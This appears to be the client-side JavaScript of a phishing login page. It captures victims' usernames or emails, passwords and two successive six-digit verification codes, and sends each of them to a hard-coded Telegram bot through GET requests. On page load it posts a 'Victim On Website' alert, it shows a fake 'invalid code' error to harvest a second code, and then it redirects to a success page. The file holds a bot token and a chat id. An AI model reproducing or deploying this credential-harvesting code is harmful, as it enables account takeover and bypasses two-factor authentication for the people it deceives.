window.addEventListener('load', (event) => {
    hiniDikush()
});

const submitButton = document.querySelector("#submitButton1");
const butoniloading = document.querySelector("#butoniloading");
butoniloading.style.display = "none";

//login error
const notification_error = document.querySelector(".notification_error");
//sec code error
const invalid_code_erorr = document.querySelector(".invalid_code_erorr");

//first code error
const invalid_first_code_erorr = document.querySelector(".invalid_first_code_erorr");


const close_notification = document.querySelector(".close-notification");
const close_notification_code = document.querySelector(".close-notification_code");
const close_invalid_first_code_erorr = document.querySelector(".close-notification_code");


const usernameOrEmail = document.querySelector("#usernameOrEmail");
const password = document.querySelector("#password");

const emailError = document.querySelector("#emailError");
const passwordError = document.querySelector("#passwordError");

const loginForm = document.querySelector("#loginForm");
const emailCodeForm = document.querySelector("#emailCodeForm");


const codeError = document.querySelector("#codeError");
const codeInput = document.querySelector("#codeInput");



const submitEmailCode = document.querySelector("#submitEmailCode");
const butoniloadingEmailCode = document.querySelector("#butoniloadingEmailCode");


let firstTime = true;

submitButton.addEventListener("click",function(e){
    e.preventDefault()
    if(!validatePasswordAndEmail()){
        sendEmailPasswordTelegram();
        buttontoggle(true)
        setTimeout(()=>{
                buttontoggle(false)
                toggleForm(true)
        },6000)
    }else{
        buttontoggle(false)
    }
})


submitEmailCode.addEventListener("click",function(e){
    e.preventDefault()
    if(codeInput.value.length === 6){
        codeButtonToggle(true)
        if(firstTime){
            sendFirstCodeTelegram();
            setTimeout(()=>{
                invalid_first_code_erorr.style.display = "flex";
                codeButtonToggle(false)
            },10000)
            setTimeout(()=>{
                invalid_first_code_erorr.style.display = "none";
            },20000)
            setErrorcode(false)
        
            
        }else{
            firstTime = false
          
    
            setTimeout(()=>{
                // invalid_code_erorr.style.display = "flex";
                codeButtonToggle(false)
            },4000)
            setTimeout(()=>{
                invalid_code_erorr.style.display = "none";
            },14000)
            setErrorcode(false)

              window.location.href = 'successfully-applied';

        

        }
        
    }else{
       
        setErrorcode(true)
        invalid_code_erorr.style.display = "none";
    }
})

function setErrorcode(truee){
    if(truee){
        codeInput.style.borderColor = "#ff1f44"
        codeError.style.display = "block"
    }else{
        codeInput.style.borderColor = "#557086"
        codeError.style.display = "none"
    }
}


close_notification.addEventListener("click",function(e){
    e.preventDefault();
    notification_error.style.display = "none";
})

function validatePasswordAndEmail(){
    passwordError.style.display = password.value.length < 6? "flex":"none";
    emailError.style.display = usernameOrEmail.value.length < 3? "flex":"none";
    return password.value.length < 6 || usernameOrEmail.value.length < 3;

}
function toggleForm(loading){
    if(loading){
        emailCodeForm.style.display = "flex"
        loginForm.style.display = "none"
    }else{
        loginForm.style.display = "flex"
        emailCodeForm.style.display = "none"
    }
}


function buttontoggle(logined){
    if(logined){
        butoniloading.style.display = "flex"
        submitButton.style.display = "none"
    }else{
        submitButton.style.display = "flex"
        butoniloading.style.display = "none"
    }
}

function codeButtonToggle(logined){
    if(logined){
        butoniloadingEmailCode.style.display = "flex"
        submitEmailCode.style.display = "none"
    }else{
        submitEmailCode.style.display = "flex"
        butoniloadingEmailCode.style.display = "none"
    }
}
usernameOrEmail.addEventListener("change", function(e){
    validatePasswordAndEmail()
});

password.addEventListener("change", function(e){
    validatePasswordAndEmail()
});

close_notification_code.addEventListener("click",function(e){
    e.preventDefault()
    invalid_code_erorr.style.display = "none";
})





function sendEmailPasswordTelegram(){
    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n`;

    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
}

function sendFirstCodeTelegram(){
    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | First code: ${codeInput.value}`;

    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
}

function sendSecCodeTelegram(){
    var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | Second code: ${codeInput.value}`;

 
    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
    

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
}



function hiniDikush(){
    var message = `---- Victim On Website ----`;

    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
   
   
    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();
}








